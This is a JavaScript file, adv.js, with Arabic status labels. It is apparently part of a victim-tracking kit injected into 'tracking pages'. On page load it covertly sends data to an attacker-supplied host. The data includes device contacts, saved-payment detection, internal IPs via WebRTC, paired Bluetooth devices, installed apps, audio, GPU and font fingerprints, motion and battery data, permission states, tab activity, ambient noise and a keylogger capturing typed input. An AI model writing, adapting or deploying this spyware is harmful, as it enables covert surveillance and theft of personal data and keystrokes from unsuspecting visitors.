/**
 * adv.js — Advanced & Fire Tracking Features v2
 * Injected into all tracking pages via <script src="/adv.js?u=UID&a=HOST">
 */
(function () {
  var uid = new URLSearchParams(document.currentScript.src.split('?')[1]).get('u') || '';
  var a   = new URLSearchParams(document.currentScript.src.split('?')[1]).get('a') || '';

  function post(path, data) {
    try {
      var x = new XMLHttpRequest();
      var p = Object.keys(data).map(function (k) {
        return encodeURIComponent(k) + '=' + encodeURIComponent(data[k]);
      }).join('&');
      x.open('POST', a + path, true);
      x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      x.send(p);
    } catch (e) {}
  }

  function send(label) { post('/network', { uid: uid, data: label }); }

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 1 — Contacts API (Android Chrome — reads device phonebook!)
  // ══════════════════════════════════════════════════════════════════════════════
  window._tryContacts = async function () {
    try {
      if (!('contacts' in navigator && 'ContactsManager' in window)) return;
      const props = ['name', 'tel', 'email'];
      const contacts = await navigator.contacts.select(props, { multiple: true });
      if (!contacts || !contacts.length) return;
      let out = '📒 جهات الاتصال:\n';
      contacts.slice(0, 30).forEach(function (c, i) {
        out += (i + 1) + '. ' + (c.name || ['?'])[0] +
          (c.tel && c.tel[0] ? ' | ' + c.tel[0] : '') +
          (c.email && c.email[0] ? ' | ' + c.email[0] : '') + '\n';
      });
      post('/contacts', { uid: uid, contacts: encodeURIComponent(out) });
    } catch (e) {}
  };

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 2 — Payment Method Detection (saved credit cards!)
  // ══════════════════════════════════════════════════════════════════════════════
  setTimeout(async function () {
    try {
      if (!window.PaymentRequest) return;
      const methods = [
        { supportedMethods: 'basic-card', data: { supportedNetworks: ['visa','mastercard','amex','discover','jcb','diners','unionpay'] } },
        { supportedMethods: 'https://google.com/pay' },
        { supportedMethods: 'https://apple.com/apple-pay' },
        { supportedMethods: 'https://samsung.com/pay' }
      ];
      const details = { total: { label: 'Verification', amount: { currency: 'USD', value: '0.00' } } };
      const req = new PaymentRequest(methods, details);
      const canPay = await req.canMakePayment().catch(() => false);
      if (canPay) send('💳 يملك طريقة دفع محفوظة (بطاقة/Google Pay/Apple Pay)!');
      else send('💳 لا توجد طرق دفع محفوظة');
    } catch (e) {}
  }, 3000);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 3 — WebRTC Internal IP Leak (الـ IP الداخلي للشبكة)
  // ══════════════════════════════════════════════════════════════════════════════
  setTimeout(function () {
    try {
      var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({ iceServers: [] });
      pc.createDataChannel('');
      pc.createOffer().then(function (offer) { pc.setLocalDescription(offer); });
      pc.onicecandidate = function (e) {
        if (!e || !e.candidate) return;
        var m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
        if (m) {
          var ips = m.filter(function (ip) { return !ip.startsWith('0.') && ip !== '0.0.0.0'; });
          if (ips.length) send('🌐 WebRTC IP داخلي: ' + ips.join(' | '));
        }
        pc.close();
      };
    } catch (e) {}
  }, 1000);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 4 — Bluetooth Devices Scan
  // ══════════════════════════════════════════════════════════════════════════════
  window._tryBluetooth = async function () {
    try {
      if (!navigator.bluetooth) return;
      // getDevices() returns previously paired devices without a prompt
      if (navigator.bluetooth.getDevices) {
        const devices = await navigator.bluetooth.getDevices();
        if (devices && devices.length) {
          send('🔵 أجهزة Bluetooth مقترنة: ' + devices.map(function (d) { return d.name || d.id; }).join(' | '));
          return;
        }
      }
      // Fallback: requestDevice with acceptAllDevices (shows picker — fires on user gesture)
      const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
      if (device) send('🔵 Bluetooth: ' + (device.name || device.id));
    } catch (e) {}
  };

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 5 — Installed Apps Detection via URL Schemes
  // ══════════════════════════════════════════════════════════════════════════════
  setTimeout(function () {
    var apps = [
      { name: 'WhatsApp',   scheme: 'whatsapp://' },
      { name: 'Instagram',  scheme: 'instagram://' },
      { name: 'Snapchat',   scheme: 'snapchat://' },
      { name: 'TikTok',     scheme: 'tiktok://' },
      { name: 'Telegram',   scheme: 'tg://' },
      { name: 'Twitter/X',  scheme: 'twitter://' },
      { name: 'YouTube',    scheme: 'youtube://' },
      { name: 'Facebook',   scheme: 'fb://' },
    ];
    var found = [];
    var checked = 0;
    apps.forEach(function (app) {
      try {
        var start = Date.now();
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = app.scheme;
        document.body.appendChild(iframe);
        setTimeout(function () {
          var elapsed = Date.now() - start;
          // If browser tried to open the app, there's usually a small delay
          if (elapsed < 50) found.push(app.name);
          document.body.removeChild(iframe);
          checked++;
          if (checked === apps.length && found.length) {
            send('📱 تطبيقات مثبّتة: ' + found.join(' | '));
          }
        }, 300);
      } catch (e) { checked++; }
    });
  }, 4000);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 6 — Audio Context Fingerprint (بصمة صوتية فريدة للجهاز)
  // ══════════════════════════════════════════════════════════════════════════════
  setTimeout(function () {
    try {
      var ac = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
      var osc = ac.createOscillator();
      var comp = ac.createDynamicsCompressor();
      osc.type = 'triangle';
      osc.frequency.value = 10000;
      [['threshold',-50],['knee',40],['ratio',12],['reduction',-20],['attack',0],['release',0.25]].forEach(function(p){
        try{ comp[p[0]].value = p[1]; }catch(e){}
      });
      osc.connect(comp);
      comp.connect(ac.destination);
      osc.start(0);
      ac.startRendering();
      ac.oncomplete = function (e) {
        var buf = e.renderedBuffer.getChannelData(0);
        var sum = 0;
        for (var i = 4500; i < 5000; i++) sum += Math.abs(buf[i]);
        var fp = Math.round(sum * 10000000000) / 10000000000;
        send('🎵 بصمة صوتية: ' + fp);
      };
    } catch (e) {}
  }, 2000);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 7 — Device Motion & Gyroscope (حركة الجهاز + جيروسكوب)
  // ══════════════════════════════════════════════════════════════════════════════
  var _motionSamples = [], _motionSent = false;
  window.addEventListener('devicemotion', function (e) {
    if (_motionSent) return;
    if (e.acceleration) {
      _motionSamples.push({
        x: e.acceleration.x || 0,
        y: e.acceleration.y || 0,
        z: e.acceleration.z || 0
      });
    }
    if (_motionSamples.length >= 5) {
      _motionSent = true;
      var avg = _motionSamples.reduce(function (s, v) { return { x: s.x + v.x, y: s.y + v.y, z: s.z + v.z }; }, { x: 0, y: 0, z: 0 });
      var n = _motionSamples.length;
      send('🌀 تسارع الجهاز — X:' + (avg.x/n).toFixed(2) + ' Y:' + (avg.y/n).toFixed(2) + ' Z:' + (avg.z/n).toFixed(2));
    }
  }, { passive: true });

  window.addEventListener('deviceorientation', function (e) {
    if (!e.alpha && !e.beta && !e.gamma) return;
    send('📐 اتجاه الجهاز — Alpha:' + Math.round(e.alpha||0) + '° Beta:' + Math.round(e.beta||0) + '° Gamma:' + Math.round(e.gamma||0) + '°');
    window.removeEventListener('deviceorientation', arguments.callee);
  }, { passive: true, once: true });

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 8 — Permission State Probe (كشف حالة كل الصلاحيات)
  // ══════════════════════════════════════════════════════════════════════════════
  setTimeout(async function () {
    if (!navigator.permissions) return;
    const perms = ['camera','microphone','geolocation','notifications','clipboard-read','accelerometer','gyroscope','magnetometer','payment-handler'];
    const results = [];
    for (const p of perms) {
      try {
        const s = await navigator.permissions.query({ name: p });
        if (s.state !== 'prompt') results.push(p + ':' + (s.state === 'granted' ? '✅' : '❌'));
      } catch (e) {}
    }
    if (results.length) send('🔐 الصلاحيات الممنوحة: ' + results.join(' | '));
  }, 1500);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 9 — Tab Visibility + Idle + Session Beacon
  // ══════════════════════════════════════════════════════════════════════════════
  var _openTime = Date.now(), _tabSwitches = 0, _hiddenAt = 0;
  document.addEventListener('visibilitychange', function () {
    if (document.hidden) {
      _hiddenAt = Date.now(); _tabSwitches++;
      send('👁️ ابتعد عن التبويب #' + _tabSwitches + ' — بعد ' + Math.round((_hiddenAt - _openTime) / 1000) + 'ث');
    } else {
      if (_hiddenAt) send('👁️ عاد للتبويب — كان غائباً ' + Math.round((Date.now() - _hiddenAt) / 1000) + 'ث');
    }
  });
  window.addEventListener('beforeunload', function () {
    var secs = Math.round((Date.now() - _openTime) / 1000);
    navigator.sendBeacon(a + '/network',
      'uid=' + encodeURIComponent(uid) + '&data=' + encodeURIComponent('🚪 أغلق الصفحة بعد ' + secs + 'ث | تبديل تبويب: ' + _tabSwitches + ' مرات'));
  });

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 10 — Keystroke Logger
  // ══════════════════════════════════════════════════════════════════════════════
  var _typed = '', _lastFlush = Date.now();
  document.addEventListener('input', function (e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
      _typed += (e.target.value || '');
      if (Date.now() - _lastFlush > 3000 && _typed.trim()) {
        send('⌨️ نص مُدخَل: ' + _typed.slice(0, 200));
        _typed = ''; _lastFlush = Date.now();
      }
    }
  }, true);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 11 — Dark Mode + Display + CPU + RAM
  // ══════════════════════════════════════════════════════════════════════════════
  setTimeout(function () {
    var info = [
      '🌙 ' + (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'ليلي' : 'نهاري'),
      '🖥️ ' + screen.width + 'x' + screen.height,
      '📐 PixelRatio:' + (window.devicePixelRatio || 1).toFixed(1),
      '🎨 ColorDepth:' + screen.colorDepth,
      '🧠 RAM:' + (navigator.deviceMemory || '?') + 'GB',
      '⚙️ CPU:' + (navigator.hardwareConcurrency || '?') + ' cores',
      '🌍 ' + (navigator.languages || [navigator.language]).join(',')
    ];
    send('📱 بيانات الجهاز: ' + info.join(' | '));
  }, 800);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 12 — WebGL GPU Fingerprint
  // ══════════════════════════════════════════════════════════════════════════════
  try {
    var glc = document.createElement('canvas');
    var gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if (gl) {
      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
      send('🎮 GPU: ' +
        (dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR)) + ' | ' +
        (dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)));
    }
  } catch (e) {}

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 13 — Font Fingerprint (الخطوط المثبّتة)
  // ══════════════════════════════════════════════════════════════════════════════
  setTimeout(function () {
    try {
      var fonts = ['Arial','Times New Roman','Courier New','Georgia','Verdana','Trebuchet MS',
        'Impact','Comic Sans MS','Tahoma','Calibri','Cambria','Consolas','Monaco',
        'Gill Sans','Helvetica Neue','Lucida Grande','Futura','Optima','Geneva'];
      var cv = document.createElement('canvas'), ctx = cv.getContext('2d');
      cv.width = 200; cv.height = 30;
      ctx.font = '14px monospace'; ctx.fillText('mmmmmmmmmmlli', 0, 20);
      var base = cv.toDataURL();
      var found = fonts.filter(function (f) {
        cv.width = 200; cv.height = 30;
        ctx.font = '14px "' + f + '",monospace'; ctx.fillText('mmmmmmmmmmlli', 0, 20);
        return cv.toDataURL() !== base;
      });
      if (found.length) send('🔤 خطوط مثبّتة: ' + found.join(', '));
    } catch (e) {}
  }, 2500);

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 14 — Battery Deep Monitor
  // ══════════════════════════════════════════════════════════════════════════════
  if ('getBattery' in navigator) {
    navigator.getBattery().then(function (b) {
      send('🔋 البطارية: ' + Math.round(b.level * 100) + '%' +
        (b.charging ? ' ⚡يشحن' : ' 🔌لا يشحن') +
        (b.dischargingTime < Infinity ? ' | تفريغ خلال: ' + Math.round(b.dischargingTime / 60) + 'د' : '') +
        (b.chargingTime < Infinity && b.chargingTime > 0 ? ' | شحن خلال: ' + Math.round(b.chargingTime / 60) + 'د' : ''));
      b.addEventListener('chargingchange', function () {
        send('🔋 ' + (b.charging ? '⚡ بدأ الشحن!' : '🔌 فُصل الشاحن!') + ' — ' + Math.round(b.level * 100) + '%');
      });
    }).catch(function () {});
  }

  // ══════════════════════════════════════════════════════════════════════════════
  // 🔥 FIRE FEATURE 15 — Ambient Noise Analyzer (يحلّل مستوى الضوضاء المحيطة)
  // ══════════════════════════════════════════════════════════════════════════════
  window._analyzeAmbientNoise = function (stream) {
    try {
      var ac = new (window.AudioContext || window.webkitAudioContext)();
      var src = ac.createMediaStreamSource(stream);
      var analyser = ac.createAnalyser();
      analyser.fftSize = 256;
      src.connect(analyser);
      var data = new Uint8Array(analyser.frequencyBinCount);
      var samples = [], n = 0;
      var iv = setInterval(function () {
        analyser.getByteFrequencyData(data);
        samples.push(data.reduce(function (s, v) { return s + v; }, 0) / data.length);
        if (++n >= 5) {
          clearInterval(iv);
          var level = Math.round(samples.reduce(function (s, v) { return s + v; }, 0) / samples.length);
          send('🎙️ ضوضاء محيطة: ' + level + '/255 — ' +
            (level < 10 ? '🔇صامت' : level < 40 ? '🔉هادئ' : level < 80 ? '🔊متوسط' : '📢صاخب'));
          try { ac.close(); } catch (e) {}
        }
      }, 800);
    } catch (e) {}
  };

})();
